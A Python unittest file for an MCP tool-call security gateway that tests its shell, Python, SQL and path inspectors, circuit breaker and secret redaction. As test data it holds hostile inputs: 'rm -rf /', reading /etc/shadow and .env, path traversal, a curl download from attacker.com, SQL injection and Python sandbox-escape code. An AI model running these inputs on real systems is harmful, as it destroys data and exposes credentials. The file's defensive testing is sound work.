import unittest
import io
import json
import time
from pathlib import Path

from mcp_proxy.gateway import Gateway
from mcp_proxy.cli import build_default_gateway
from mcp_proxy.inspectors.base import InspectorDispatcher, ParserError
from mcp_proxy.inspectors.shell import ShellASTInspector
from mcp_proxy.inspectors.python_ast import PythonASTInspector
from mcp_proxy.inspectors.sql import SQLASTInspector
from mcp_proxy.inspectors.path import PathTraversalInspector
from mcp_proxy.circuit_breaker import CircuitBreaker
from mcp_proxy.schema_validator import SchemaValidator
from mcp_proxy.dlp import DLPRedactor
from mcp_proxy.flight_recorder import FlightRecorder


class TestAdversarialSecurity(unittest.TestCase):
    def setUp(self):
        self.root_dir = Path(__file__).parent.parent.resolve()
        self.circuit_breaker = CircuitBreaker(failure_threshold=3, window_seconds=60.0)
        self.schema_validator = SchemaValidator()
        self.dlp_redactor = DLPRedactor()
        self.flight_recorder = FlightRecorder()

        # Register sample tool schemas
        self.schema_validator.register_tool_schema(
            "execute_command",
            {
                "type": "object",
                "properties": {"command": {"type": "string"}},
                "required": ["command"]
            }
        )
        self.schema_validator.register_tool_schema(
            "run_python",
            {
                "type": "object",
                "properties": {"code": {"type": "string"}},
                "required": ["code"]
            }
        )
        self.schema_validator.register_tool_schema(
            "query_sql",
            {
                "type": "object",
                "properties": {"query": {"type": "string"}},
                "required": ["query"]
            }
        )
        self.schema_validator.register_tool_schema(
            "read_file",
            {
                "type": "object",
                "properties": {"path": {"type": "string"}},
                "required": ["path"]
            }
        )

        self.dispatcher = InspectorDispatcher()
        self.dispatcher.register("execute_command", ShellASTInspector(allowed_binaries={"ls", "git", "echo", "pwd"}))
        self.dispatcher.register("run_python", PythonASTInspector())
        self.dispatcher.register("query_sql", SQLASTInspector(allowed_tables={"empl"}))
        self.dispatcher.register("read_file", PathTraversalInspector(root_dir=self.root_dir))

        self.gateway = Gateway(
            target_cmd=["echo", "noop"],
            dispatcher=self.dispatcher,
            schema_validator=self.schema_validator,
            circuit_breaker=self.circuit_breaker,
            dlp_redactor=self.dlp_redactor,
            flight_recorder=self.flight_recorder,
        )

    def _simulate_client_call(self, tool_name: str, arguments: dict, req_id: int = 1) -> dict:
        out_stream = io.StringIO()
        req_line = json.dumps({
            "jsonrpc": "2.0",
            "id": req_id,
            "method": "tools/call",
            "params": {"name": tool_name, "arguments": arguments}
        })
        self.gateway.handle_client_message(req_line, out_stream=out_stream)
        output = out_stream.getvalue().strip()
        if output:
            return json.loads(output)
        return {}

    # --- Test Phase 3: Shell AST Sanitizer & Escape Attacks ---
    def test_shell_command_chaining_semicolon(self):
        res = self._simulate_client_call("execute_command", {"command": "ls -la; cat /etc/shadow"})
        self.assertIn("error", res)
        self.assertIn("Compound command chaining", res["error"]["message"])

    def test_shell_command_chaining_and(self):
        res = self._simulate_client_call("execute_command", {"command": "echo test && rm -rf /"})
        self.assertIn("error", res)
        self.assertIn("Compound command chaining", res["error"]["message"])

    def test_shell_subshell_dollar_paren(self):
        res = self._simulate_client_call("execute_command", {"command": "echo $(whoami)"})
        self.assertIn("error", res)
        self.assertIn("Subshell and command substitution", res["error"]["message"])

    def test_shell_subshell_backticks(self):
        res = self._simulate_client_call("execute_command", {"command": "ls `id`"})
        self.assertIn("error", res)
        self.assertIn("Subshell and command substitution", res["error"]["message"])

    def test_shell_io_redirection(self):
        res = self._simulate_client_call("execute_command", {"command": "echo evil > /etc/passwd"})
        self.assertIn("error", res)
        self.assertIn("I/O redirection is forbidden", res["error"]["message"])

    def test_shell_unauthorized_binary(self):
        res = self._simulate_client_call("execute_command", {"command": "curl http://attacker.com/malware"})
        self.assertIn("error", res)
        self.assertIn("Binary 'curl' is not in the allowed command list", res["error"]["message"])

    def test_shell_allowlisted_binary_passes(self):
        out_stream = io.StringIO()
        req_line = json.dumps({
            "jsonrpc": "2.0",
            "id": 99,
            "method": "tools/call",
            "params": {"name": "execute_command", "arguments": {"command": "git status"}}
        })
        self.gateway.handle_client_message(req_line, out_stream=out_stream)
        self.assertEqual(out_stream.getvalue().strip(), "")

    # --- Test Phase 3: Path Traversal Guard ---
    def test_path_traversal_dot_dot(self):
        res = self._simulate_client_call("read_file", {"path": "../../../../etc/passwd"})
        self.assertIn("error", res)
        self.assertIn("Path traversal detected", res["error"]["message"])

    def test_path_traversal_absolute_escape(self):
        res = self._simulate_client_call("read_file", {"path": "/etc/shadow"})
        self.assertIn("error", res)
        self.assertIn("Path traversal detected", res["error"]["message"])

    def test_path_traversal_hidden_env_file(self):
        res = self._simulate_client_call("read_file", {"path": ".env"})
        self.assertIn("error", res)
        self.assertIn("Access to hidden file or directory", res["error"]["message"])

    # --- Test Phase 3: SQL AST Inspector ---
    def test_sql_drop_table(self):
        res = self._simulate_client_call("query_sql", {"query": "DROP TABLE empl;"})
        self.assertIn("error", res)
        self.assertIn("Destructive SQL operation", res["error"]["message"])

    def test_sql_delete_statement(self):
        res = self._simulate_client_call("query_sql", {"query": "DELETE FROM empl WHERE 1=1"})
        self.assertIn("error", res)
        self.assertIn("Destructive SQL operation", res["error"]["message"])

    def test_sql_stacked_injection(self):
        res = self._simulate_client_call("query_sql", {"query": "SELECT * FROM empl; DROP TABLE empl;"})
        self.assertIn("error", res)
        self.assertIn("Multi-statement SQL execution", res["error"]["message"])

    def test_sql_unauthorized_table(self):
        res = self._simulate_client_call("query_sql", {"query": "SELECT * FROM salary_secrets"})
        self.assertIn("error", res)
        self.assertIn("Access to table 'salary_secrets' is forbidden", res["error"]["message"])

    # --- Test Phase 3: Python AST Inspector ---
    def test_python_forbidden_module_import(self):
        res = self._simulate_client_call("run_python", {"code": "import subprocess\nsubprocess.run('id')"})
        self.assertIn("error", res)
        self.assertIn("Importing forbidden module: 'subprocess'", res["error"]["message"])

    def test_python_forbidden_call_eval(self):
        res = self._simulate_client_call("run_python", {"code": "eval('__import__(\"os\").system(\"id\")')"})
        self.assertIn("error", res)
        self.assertIn("Calling forbidden function: 'eval()'", res["error"]["message"])

    def test_python_reflection_subclasses(self):
        res = self._simulate_client_call("run_python", {"code": "x = ().__class__.__bases__[0].__subclasses__()"})
        self.assertIn("error", res)
        self.assertIn("Accessing forbidden attribute", res["error"]["message"])

    # --- Test Phase 2: Schema Validation & Contract Violation ---
    def test_schema_invalid_type(self):
        res = self._simulate_client_call("execute_command", {"command": 12345})
        self.assertIn("error", res)
        self.assertEqual(res["error"]["code"], -32602)
        self.assertIn("Gateway Contract Violation: Field 'command'", res["error"]["message"])

    def test_schema_missing_required(self):
        res = self._simulate_client_call("execute_command", {})
        self.assertIn("error", res)
        self.assertEqual(res["error"]["code"], -32602)
        self.assertIn("is a required property", res["error"]["message"])

    # --- Test Phase 2: Anti-Loop Circuit Breaker ---
    def test_circuit_breaker_trips_after_three_repeated_failures(self):
        bad_args = {"command": "curl http://malicious.org"}

        # Attempt 1 -> policy denial
        res1 = self._simulate_client_call("execute_command", bad_args, req_id=1)
        self.assertIn("Binary 'curl' is not in the allowed command list", res1["error"]["message"])

        # Attempt 2 -> policy denial
        res2 = self._simulate_client_call("execute_command", bad_args, req_id=2)
        self.assertIn("Binary 'curl' is not in the allowed command list", res2["error"]["message"])

        # Attempt 3 -> circuit breaker is tripped!
        res3 = self._simulate_client_call("execute_command", bad_args, req_id=3)
        self.assertEqual(res3["error"]["code"], -32000)
        self.assertIn("Circuit breaker tripped", res3["error"]["message"])

    # --- Test Phase 4: DLP Response Redaction ---
    def test_dlp_response_redaction_secrets(self):
        out_stream = io.StringIO()
        raw_server_response = json.dumps({
            "jsonrpc": "2.0",
            "id": 10,
            "result": {
                "content": [
                    {
                        "type": "text",
                        "text": "Credentials leaked: AWS_KEY=AKIAIOSFODNN7EXAMPLE and GITHUB=ghp_123456789012345678901234567890123456"
                    }
                ]
            }
        })
        self.gateway.handle_server_message(raw_server_response, out_stream=out_stream)
        redacted = json.loads(out_stream.getvalue().strip())
        text = redacted["result"]["content"][0]["text"]
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", text)
        self.assertNotIn("ghp_123456789012345678901234567890123456", text)
        self.assertIn("[REDACTED_BY_GATEWAY]", text)


if __name__ == "__main__":
    unittest.main()
